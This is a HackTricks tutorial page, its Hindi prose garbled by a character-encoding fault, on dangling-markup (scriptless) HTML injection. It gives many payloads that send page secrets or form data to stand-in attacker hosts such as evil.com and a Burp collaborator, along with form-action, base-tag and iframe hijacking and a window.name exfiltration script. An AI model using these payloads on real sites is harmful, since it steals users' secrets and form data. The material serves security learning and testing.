# Dangling Markup - HTML scriptless injection

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ.

</details>

## рд╕рд╛рд░рд╛рдВрд╢

рдпрд╣ рддрдХрдиреАрдХ рддрдм рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ рдЬрдм **HTML рдЗрдВрдЬреЗрдХреНрд╢рди рдкрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**. рдпрд╣ рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рд╣реИ рдпрджрд┐ рдЖрдк **XSS рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХрд╛ рдХреЛрдИ рддрд░реАрдХрд╛ рдирд╣реАрдВ рдкрд╛рддреЗ** рд▓реЗрдХрд┐рди рдЖрдк рдХреБрдЫ HTML рдЯреИрдЧреНрд╕ **рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**.\
рдпрд╣ рддрдм рднреА рдЙрдкрдпреЛрдЧреА рд╣реИ рдЬрдм рдХреБрдЫ **рд╕реАрдХреНрд░реЗрдЯ рд╕рд╛рдлрд╝ рдЯреЗрдХреНрд╕реНрдЯ рдореЗрдВ рд╕реЗрд╡ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ** рдФрд░ рдЖрдк рдЙрд╕реЗ рдХреНрд▓рд╛рдЗрдВрдЯ рд╕реЗ **рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓рдирд╛** рдЪрд╛рд╣рддреЗ рд╣реЛрдВ, рдпрд╛ рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рдЧреБрдорд░рд╛рд╣ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реЛрдВ.

рдпрд╣рд╛рдВ рдмрддрд╛рдИ рдЧрдИ рдХрдИ рддрдХрдиреАрдХреЗрдВ рдХреБрдЫ [**Content Security Policy**](../content-security-policy-csp-bypass/) рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ, рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рддрд░реАрдХреЛрдВ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП (html рдЯреИрдЧреНрд╕, CSS, http-meta рдЯреИрдЧреНрд╕, рдлреЙрд░реНрдореНрд╕, рдмреЗрд╕...).

## рдореБрдЦреНрдп рдЕрдиреБрдкреНрд░рдпреЛрдЧ

### рд╕рд╛рдлрд╝ рдЯреЗрдХреНрд╕реНрдЯ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдЪреБрд░рд╛рдирд╛

рдпрджрд┐ рдЖрдк `<img src='http://evil.com/log.cgi?` рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рддреЗ рд╣реИрдВ рдЬрдм рдкреЗрдЬ рд▓реЛрдб рд╣реЛрддрд╛ рд╣реИ рддреЛ рдкреАрдбрд╝рд┐рдд рдЖрдкрдХреЛ рдЗрдВрдЬреЗрдХреНрдЯреЗрдб `img` рдЯреИрдЧ рдФрд░ рдХреЛрдб рдХреЗ рдЕрдВрджрд░ рдЕрдЧрд▓реЗ рдХреЛрдЯ рдХреЗ рдмреАрдЪ рд╕рднреА рдХреЛрдб рднреЗрдЬреЗрдЧрд╛. рдпрджрд┐ рдХреЛрдИ рд╕реАрдХреНрд░реЗрдЯ рдЙрд╕ рдЪрдВрдХ рдореЗрдВ рдХрд┐рд╕реА рддрд░рд╣ рд╕реНрдерд┐рдд рд╣реИ, рддреЛ рдЖрдк рдЙрд╕реЗ рдЪреБрд░рд╛ рд▓реЗрдВрдЧреЗ (рдЖрдк рдпрд╣реА рдХрд╛рдо рдбрдмрд▓ рдХреЛрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рджреЗрдЦреЗрдВ рдХрд┐ рдХреМрди рд╕рд╛ рдЕрдзрд┐рдХ рджрд┐рд▓рдЪрд╕реНрдк рд╣реЛ рд╕рдХрддрд╛ рд╣реИ).

рдпрджрд┐ `img` рдЯреИрдЧ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рд╣реИ (CSP рдХреЗ рдХрд╛рд░рдг рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП) рддреЛ рдЖрдк `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?` рдХрд╛ рдЙрдкрдпреЛрдЧ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ.
```
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **Chrome HTTP URLs рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рддрд╛ рд╣реИ** рдЬрд┐рд╕рдореЗрдВ "<" рдпрд╛ "\n" рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдк "ftp" рдЬреИрд╕реА рдЕрдиреНрдп рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╕реНрдХреАрдореНрд╕ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдк CSS `@import` рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдпрд╣ рд╕рднреА рдХреЛрдб рдХреЛ рддрдм рддрдХ рднреЗрдЬреЗрдЧрд╛ рдЬрдм рддрдХ рдЗрд╕реЗ ";") рдирд╣реАрдВ рдорд┐рд▓ рдЬрд╛рддрд╛)
```markup
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
рдЖрдк **`<table`** рдХрд╛ рднреА рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
<table background='//your-collaborator-id.burpcollaborator.net?'
```
рдЖрдк `<base` рдЯреИрдЧ рднреА рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВред рд╕рднреА рдЬрд╛рдирдХрд╛рд░реА рднреЗрдЬреА рдЬрд╛рдПрдЧреА рдЬрдм рддрдХ рдХрд┐ рдХреЛрдЯ рдмрдВрдж рдирд╣реАрдВ рд╣реЛ рдЬрд╛рддрд╛, рд▓реЗрдХрд┐рди рдЗрд╕рдХреЗ рд▓рд┐рдП рдХреБрдЫ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдВрдкрд░реНрдХ (user interaction) рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ (рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХрд┐рд╕реА рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдирд╛ рд╣реЛрдЧрд╛, рдХреНрдпреЛрдВрдХрд┐ base рдЯреИрдЧ рдиреЗ рд▓рд┐рдВрдХ рджреНрд╡рд╛рд░рд╛ рдЗрдВрдЧрд┐рдд рдбреЛрдореЗрди рдХреЛ рдмрджрд▓ рджрд┐рдпрд╛ рд╣реЛрдЧрд╛):
```markup
<base target='        <--- Injected
steal me'<b>test</b>
```
### рдлреЙрд░реНрдореНрд╕ рдЪреБрд░рд╛рдирд╛
```markup
<base href='http://evil.com/'>
```
рддрдм, рдЬреЛ рдлреЙрд░реНрдореНрд╕ рдбреЗрдЯрд╛ рдкрде рдкрд░ рднреЗрдЬрддреЗ рд╣реИрдВ (рдЬреИрд╕реЗ `<form action='update_profile.php'>`) рд╡реЗ рдбреЗрдЯрд╛ рдХреЛ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдбреЛрдореЗрди рдкрд░ рднреЗрдЬ рджреЗрдВрдЧреЗред

### рдлреЙрд░реНрдореНрд╕ рдЪреБрд░рд╛рдирд╛ 2

рдПрдХ рдлреЙрд░реНрдо рд╣реЗрдбрд░ рд╕реЗрдЯ рдХрд░реЗрдВ: `<form action='http://evil.com/log_steal'>` рдпрд╣ рдЕрдЧрд▓реЗ рдлреЙрд░реНрдо рд╣реЗрдбрд░ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░ рджреЗрдЧрд╛ рдФрд░ рдлреЙрд░реНрдо рд╕реЗ рд╕рд╛рд░рд╛ рдбреЗрдЯрд╛ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛ред

### рдлреЙрд░реНрдореНрд╕ рдЪреБрд░рд╛рдирд╛ 3

рдмрдЯрди рдЙрд╕ URL рдХреЛ рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИ рдЬрд╣рд╛рдБ рдлреЙрд░реНрдо рдХреА рдЬрд╛рдирдХрд╛рд░реА рднреЗрдЬреА рдЬрд╛ рд░рд╣реА рд╣реИ "formaction" рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЗ рд╕рд╛рде:
```markup
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```
рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЬрд╛рдирдХрд╛рд░реА рдЪреБрд░рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рд░рд╣рд╕реНрдпреЛрдВ рдХреА рдЪреЛрд░реА 2

рдлреЙрд░реНрдореНрд╕ рдЪреБрд░рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрд▓реНрд▓реЗрдЦрд┐рдд рдирд╡реАрдирддрдо рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП (рдПрдХ рдирдпрд╛ рдлреЙрд░реНрдо рд╣реЗрдбрд░ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдирд╛) рдЖрдк рддрдм рдПрдХ рдирдпрд╛ рдЗрдирдкреБрдЯ рдлреАрд▓реНрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```markup
<input type='hidden' name='review_body' value="
```
рдФрд░ рдпрд╣ рдЗрдирдкреБрдЯ рдлрд╝реАрд▓реНрдб рдЕрдкрдиреЗ рдбрдмрд▓ рдХреЛрдЯ рдХреЗ рдмреАрдЪ рдХреА рд╕рднреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдФрд░ HTML рдореЗрдВ рдЕрдЧрд▓реЗ рдбрдмрд▓ рдХреЛрдЯ рддрдХ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рд╕рдорд╛рд╣рд┐рдд рдХрд░реЗрдЧрд╛ред рдпрд╣ рд╣рдорд▓рд╛ "_**Stealing clear text secrets**_" рдФрд░ "_**Stealing forms2**_" рдХреЛ рдорд┐рд▓рд╛рддрд╛ рд╣реИред

рдЖрдк рдПрдХ рдлреЙрд░реНрдо рдФрд░ рдПрдХ `<option>` рдЯреИрдЧ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдХреЗ рднреА рдпрд╣реА рдХрд╛рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЬрдм рддрдХ рдПрдХ рдмрдВрдж `</option>` рдирд╣реАрдВ рдорд┐рд▓ рдЬрд╛рддрд╛, рддрдм рддрдХ рд╕рднреА рдбреЗрдЯрд╛ рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛:
```markup
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### рдлреЙрд░реНрдо рдкреИрд░рд╛рдореАрдЯрд░ рдЗрдВрдЬреЗрдХреНрд╢рди

рдЖрдк рдПрдХ рдлреЙрд░реНрдо рдХрд╛ рдкрде рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдирдП рдорд╛рди рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдПрдХ рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдХреНрд░рд┐рдпрд╛ рдХреА рдЬрд╛ рд╕рдХреЗ:
```markup
<form action='/change_settings.php'>
<input type='hidden' name='invite_user'
value='fredmbogo'>                                        тЖР Injected lines

<form action="/change_settings.php">                        тЖР Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             тЖР Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```
### рдиреЛрд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рд░рд╣рд╕реНрдпреЛрдВ рдХреА рдЪреЛрд░реА

`<noscript></noscript>` рдПрдХ рдЯреИрдЧ рд╣реИ рдЬрд┐рд╕рдХреА рд╕рд╛рдордЧреНрд░реА рдХрд╛ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХреА рдЬрд╛рдПрдЧреА рдЕрдЧрд░ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ (рдЖрдк рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ Chrome рдореЗрдВ рд╕рдХреНрд╖рдо/рдЕрдХреНрд╖рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ [chrome://settings/content/javascript](chrome://settings/content/javascript))ред

рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рдмрд┐рдВрджреБ рд╕реЗ рд╡реЗрдм рдкреЗрдЬ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╕рд╛рдЗрдЯ рдкрд░ рдирд┐рдХрд╛рд▓рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдпрд╣ рд╣реЛрдЧрд╛:
```markup
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### CSP рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдВрдкрд░реНрдХ рдХреЗ рд╕рд╛рде рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛

рдЗрд╕ [portswiggers рдЕрдиреБрд╕рдВрдзрд╛рди](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup) рд╕реЗ рдЖрдк рд╕реАрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ **рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ CSP рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд** рд╡рд╛рддрд╛рд╡рд░рдг рд╕реЗ рднреА рдЖрдк рдХреБрдЫ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдВрдкрд░реНрдХ** рдХреЗ рд╕рд╛рде **рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓рдирд╛** рд╕рдВрднрд╡ рд╣реИред рдЗрд╕ рдЕрд╡рд╕рд░ рдкрд░ рд╣рдо рдкреЗрд▓реЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗ:
```markup
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдк **рдкреАрдбрд╝рд┐рдд** рд╕реЗ рдПрдХ **рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд╣реЗрдВрдЧреЗ рдЬреЛ рдЙрд╕реЗ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд **payload** рдкрд░ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдХрд░реЗрдЧрд╛ред рдпрд╣ рднреА рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **`base`** рдЯреИрдЧ рдХреЗ рдЕрдВрджрд░ **`target`** рд╡рд┐рд╢реЗрд╖рддрд╛ рдЕрдЧрд▓реЗ рдПрдХрд▓ рдЙрджреНрдзрд░рдг рддрдХ **HTML рд╕рд╛рдордЧреНрд░реА** рд░рдЦреЗрдЧреАред\
рдЗрд╕рд╕реЗ рдпрд╣ рд╣реЛрдЧрд╛ рдХрд┐ рдЕрдЧрд░ рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ **`window.name`** рдХрд╛ **рдорд╛рди** рд╡рд╣ рд╕рднреА **HTML рд╕рд╛рдордЧреНрд░реА** рд╣реЛрдЧрд╛ред рдЗрд╕рд▓рд┐рдП, рдЪреВрдВрдХрд┐ рдЖрдк рдЙрд╕ рдкреЗрдЬ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдЬрд╣рд╛рдВ рдкреАрдбрд╝рд┐рдд рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдХреЗ рдкрд╣реБрдВрдЪ рд░рд╣рд╛ рд╣реИ, рдЖрдк рдЙрд╕ **`window.name`** рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕ рдбреЗрдЯрд╛ рдХреЛ **exfiltrate** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```markup
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### рднреНрд░рд╛рдордХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╡рд░реНрдХрдлреНрд▓реЛ 1 - HTML рдиреЗрдорд╕реНрдкреЗрд╕ рдЕрдЯреИрдХ

HTML рдХреЗ рдЕрдВрджрд░ рдПрдХ рдирдпрд╛ рдЯреИрдЧ рдФрд░ рдПрдХ id рдбрд╛рд▓реЗрдВ рдЬреЛ рдЕрдЧрд▓реЗ рдЯреИрдЧ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░реЗрдЧрд╛ рдФрд░ рдПрдХ рдРрд╕рд╛ рдорд╛рди рдЬреЛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рдкреНрд░рд╡рд╛рд╣ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░реЗрдЧрд╛ред рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдЖрдк рдЪреБрди рд░рд╣реЗ рд╣реИрдВ рдХрд┐ рдЬрд╛рдирдХрд╛рд░реА рдХрд┐рд╕рдХреЗ рд╕рд╛рде рд╕рд╛рдЭрд╛ рдХреА рдЬрд╛рдПрдЧреА:
```markup
<input type='hidden' id='share_with' value='fredmbogo'>     тЖР Injected markup
...
Share this status update with:                              тЖР Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
...
request.share_with = document.getElementById('share_with').value;
...
}
```
### рднреНрд░рд╛рдордХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╡рд░реНрдХрдлреНрд▓реЛ 2 - рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдиреЗрдорд╕реНрдкреЗрд╕ рдЕрдЯреИрдХ

рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЗ рдЕрдВрджрд░ HTML рдЯреИрдЧреНрд╕ рдбрд╛рд▓рдХрд░ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдмрдирд╛рдПрдВред рдлрд┐рд░, рдпрд╣ рд╡реЗрд░рд┐рдПрдмрд▓ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдкреНрд░рд╡рд╛рд╣ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░реЗрдЧрд╛:
```markup
<img id='is_public'>                                        тЖР Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
...
if (response.access_mode == AM_PUBLIC)                    тЖР The subsequent assignment fails in IE
is_public = true;
else
is_public = false;
}

function submit_new_acls() {
...
if (is_public) request.access_mode = AM_PUBLIC;           тЖР Condition always evaluates to true
...
}
```
### JSONP рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

рдпрджрд┐ рдЖрдкрдХреЛ JSONP рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдорд┐рд▓рддрд╛ рд╣реИ, рддреЛ рдЖрдк рдордирдорд╛рдиреЗ рдбреЗрдЯрд╛ рдХреЗ рд╕рд╛рде рдордирдорд╛рдиреЗ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```markup
<script src='/editor/sharing.js'>:              тЖР Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    тЖР Injected JSONP call
set_sharing({ ... })
```
рдпрд╛ рдЖрдк рдХреБрдЫ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```markup
<script src='/search?q=a&call=alert(1)'></script>
```
### Iframe рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдПрдХ рдЪрд╛рдЗрд▓реНрдб рдбреЙрдХреНрдпреВрдореЗрдВрдЯ, рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рд╣реЛрдиреЗ рдкрд░ рднреА, рдкреЗрд░реЗрдВрдЯ рдХреЗ рд▓рд┐рдП рд▓реЛрдХреЗрд╢рди рдкреНрд░реЙрдкрд░реНрдЯреА рдХреЛ рджреЗрдЦ рдФрд░ рд╕реЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред** рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛ рдХрд┐рд╕реА рдЕрдиреНрдп рдкреЗрдЬ рддрдХ рдкрд╣реБрдБрдЪрд╛ рд╕рдХрддреЗ рд╣реИрдВ **iframe** рдХреЗ рдЕрдВрджрд░ рдХреБрдЫ рдХреЛрдб рд▓реЛрдб рдХрд░рдХреЗ рдЬреИрд╕реЗ:
```markup
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```
рдЗрд╕реЗ _**sandbox='allow-scripts allow-top-navigation'**_ рдЬреИрд╕реА рдЪреАрдЬрд╝ рдХреЗ рд╕рд╛рде рдХрдо рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдПрдХ iframe рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреА **iframe name attribute рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП** рдПрдХ рдЕрд▓рдЧ рдкреЗрдЬ рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рд▓реАрдХ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рдПрдХ iframe рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЦреБрдж рдХреЛ iframe рдХрд░рддрд╛ рд╣реИ HTML рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдЬреЛ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ iframe name attribute рдХреЗ рдЕрдВрджрд░ рджрд┐рдЦрд╛рддрд╛ рд╣реИ** рдФрд░ рдлрд┐рд░ рдЙрд╕ рдирд╛рдо рдХреЛ рдкреНрд░рд╛рд░рдВрднрд┐рдХ iframe рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рдХреЗ рдЙрд╕реЗ рд▓реАрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```html
<script>
function cspBypass(win) {
win[0].location = 'about:blank';
setTimeout(()=>alert(win[0].name), 500);
}
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes) рджреЗрдЦреЗрдВред

### \<meta рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

рдЖрдк **`meta http-equiv`** рдХрд╛ рдЙрдкрдпреЛрдЧ **рдХрдИ рдХреНрд░рд┐рдпрд╛рдУрдВ** рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐ Cookie рд╕реЗрдЯ рдХрд░рдирд╛: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` рдпрд╛ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░рдирд╛ (рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ 5 рд╕реЗрдХрдВрдб рдореЗрдВ): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

рдЗрд╕реЗ **CSP** рдХреЗ рд╕рд╛рде **рдЯрд╛рд▓рд╛** рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ **http-equiv** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╣реИ ( `Content-Security-Policy: default-src 'self';`, рдпрд╛ `Content-Security-Policy: http-equiv 'self';`)

